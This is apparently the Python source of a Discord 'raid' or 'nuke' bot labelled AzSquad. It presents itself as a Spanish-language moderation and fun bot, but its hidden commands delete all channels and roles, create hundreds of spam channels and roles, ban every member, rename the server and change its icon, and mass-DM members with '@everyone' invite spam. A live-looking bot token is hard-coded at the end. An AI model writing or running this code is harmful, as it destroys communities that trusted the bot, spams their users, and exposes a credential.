import asyncio
import datetime

import colorama
import discord
from colorama import Fore, Style
from discord.ext import commands

bot = commands.Bot(command_prefix='*', intents=discord.Intents.all(), guilds=True, members=True)

client = discord.Client()

@bot.command()
async def ping(ctx):
    await ctx.send("Pong! ")


@bot.command()

async def sum(ctx, numOne: int, numTwo: int):
    await ctx.send(numOne + numTwo)

 

@bot.command()
async def infobot(ctx):
    embed = discord.Embed(title=f"Hola a Todos en {ctx.guild.name} !", description="Hola! Soy un bot de moderacion y mucha diversion! Para obtener mas informacion pon *ayuda", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
    await ctx.send(embed=embed)

@bot.command()
async def ayuda(ctx):
    embed = discord.Embed(title="Hola!", description=f"""
    MODERACION
    ==========
    *antiinvite = Anti Spam
    *kick = expulsar
    *ban = banear
    
    DIVERSION
    =========
    *nsfw = Desbloquea +18
    *say = Repite lo que dices
    *moneda = Tirar la moneda
    *kill = mata a alguien
    *pegar = le pega a alguien""", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
    await ctx.send(embed=embed)

 




@bot.event
async def on_guild_channel_create(channel):
    for i in range(5):
        
        await channel.send(""" 

**Pwned By AzSquad, Bitch**

**#AzSquad**

@everyone



https://discord.gg/WhE8NmH42m

https://cdn.discordapp.com/attachments/919781183385120831/920027552813318224/GIF-211213_155613.gif """)



@bot.command(pass_context=True)
async def d(ctx):
     await ctx.message.delete()
     for user in ctx.guild.members:
         try:
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
 
             print(f"[+] Mensaje enviado a {user.name} ")
         except:
             print(f"[-] No se pudo enviar mensajes a  {user.name}.")
             

@bot.command()
async def n(ctx):
    print("[+] Nukeando...")
    guild = ctx.message.guild
    await ctx.message.delete()
    for c in list(ctx.message.guild.channels):
        try:
            await c.delete()

        except:
            pass
    await guild.create_text_channel("nuked")
    
        
@bot.command()
async def on(ctx):
    print("[+] Nukeando...")
    guild = ctx.message.guild
    await ctx.message.delete()
    for c in list(ctx.message.guild.channels):
        try:
            await c.delete()

        except:
            pass

    await guild.create_text_channel("Nuked")

    with open('az.jpeg', 'rb') as f:
        icon = f.read()
        await guild.edit(name='#AzSquad', icon=icon)
        ccount = 0
    for i in range(500):
        await guild.create_text_channel("azsquad")

        ccount += 1
        print(f"[+] Creando Canales | +{ccount}")
 
  
            
    
 
 

@bot.command()
async def h(ctx):
    await ctx.message.delete()

    embed = discord.Embed(title="AzSquad", description="""
    
***n**                                 
Borra todos los canales                
 

***r**
Elimina todos los roles y crea 200 roles mas          
                       

***on**                               
nuke, crea 500 canales, mdall                                            
spam, cambia icono y nombre



***i**
Cambia nombre y foto del servidor                       



***h** 
Manda los comandos de Raid


***c**                                  
crea 500 canales, spam                   


***d**                                    
MD a todos los miembros del servidor      
 

                       
***ball**       
ban a todos los miembros                       
                       
                       
***destroy**
MDALL + BANALL                       
 
""", color=0x000001)
    await ctx.author.send(embed=embed)

@bot.command()
async def destroy(ctx):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                for i in range(5):
                    await user.send("""

**#AzSquad 

#RazerSquad

Uno de tus servidores esta siendo raideado por Az - Razer

@everyone 

https://discord.gg/WhE8NmH42m


https://discord.gg/npTGzBpdWz

**


            
 """)

 
                print(f"[+] Mensaje enviado a {user.name} ")
            except:
                print(f"[-] No se pudo enviar mensajes a  {user.name}.")

        for member in ctx.guild.members:
            try:
                await member.ban()

                print(f"[+] {member} Banned")

            except:
                pass



#canales
@bot.command(pass_context=True)
async def c(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    channel = await guild.create_text_channel("azsquad")
    for i in range(500):
        await guild.create_text_channel("azsquad")
        print("[+] Creando Canales....")

 

@bot.command()
async def cn(ctx):

    print("[+] Renombrando usuarios...")
    for member in ctx.guild.members:
        try:
            nick = "PwnedByAz"
            await member.edit(nick=nick)
        except:
            pass


@bot.command()
async def ball(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.ban()

            print("[+] "+member+" Banned")
        except:
            pass

@bot.command()
async def r(ctx):
    guild = ctx.guild
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
             
            
     
    for i in range(200 - len(guild.roles)):
        try:
            guild = ctx.guild
            await guild.create_role(name="AzSquad")

        except:
            pass


  
 
@bot.command()
async def i(ctx):
     
     
    await ctx.message.delete()
    guild = ctx.message.guild
    with open('az.jpeg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='#AzSquad', icon=icon)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="*infobot para informacion :D", url="http://www.twitch.tv/"))
    print(Fore.RED+"""

 ▄▄▄      ▒███████▒
▒████▄    ▒ ▒ ▒ ▄▀░
▒██  ▀█▄  ░ ▒ ▄▀▒░ 
░██▄▄▄▄██   ▄▀▒   ░
 ▓█   ▓██▒▒███████▒
 ▒▒   ▓▒█░░▒▒ ▓░▒░▒
  ▒   ▒▒ ░░░▒ ▒ ░ ▒
  ░   ▒   ░ ░ ░ ░ ░
      ░  ░  ░ ░    
          ░          v12.15                           
""")
    print("""
    
    [*] Az Bot
 
    [*] Coded by Ranger         
                          Comandos Raid
          ================================================
                       *n | Borra todos los canales 
                      *on | combinacion                       
                       *c | crea 500 canales, spam
                       *d | MD a todos los miembros del servidor
                       *i | cambia nombre y foto del servidor
                       *r | Elimina todos los roles y crea 200 roles mas
                       *h | Manda los comandos de raid a tu MD
                    *ball | Ban a todos los miembros
                 *destroy | MDALL + BanAll
            ================================================
          
                            Esperando ordenes...            """)

@bot.event
async def on_server_join(server):
    print("Maki se unio a {0}".format(server.name))
bot.run('OTIwNDIxNTkwMTYyODgyNTgx.YbkHZw.e2GzQt6EWWNNxEyTgoyAZN_lQOU')
